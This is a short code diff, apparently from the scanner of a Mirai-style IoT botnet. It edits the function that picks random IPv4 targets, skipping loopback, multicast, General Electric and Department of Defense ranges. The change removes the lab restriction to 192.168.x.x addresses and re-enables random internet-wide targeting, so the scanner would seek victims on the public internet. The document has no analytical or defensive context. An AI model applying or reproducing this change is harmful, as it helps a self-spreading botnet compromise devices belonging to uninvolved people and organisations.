@@ -734,15 +734,15 @@ static ipv4_t get_random_ip(void)
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
 
-    //do
-    //{
+    do
+    {
         tmp = rand_next();
 
-        //o1 = tmp & 0xff;
-        //o2 = (tmp >> 8) & 0xff;
+        o1 = tmp & 0xff;
+        o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
-/*    }
+    }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
           (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
           (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
@@ -757,9 +757,8 @@ static ipv4_t get_random_ip(void)
           (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
     );
-*/
-    //return INET_ADDR(o1,o2,o3,o4);
-    return INET_ADDR(192,168,o3,o4);
+
+    return INET_ADDR(o1,o2,o3,o4);
 }
 
 static int consume_iacs(struct scanner_connection *conn)
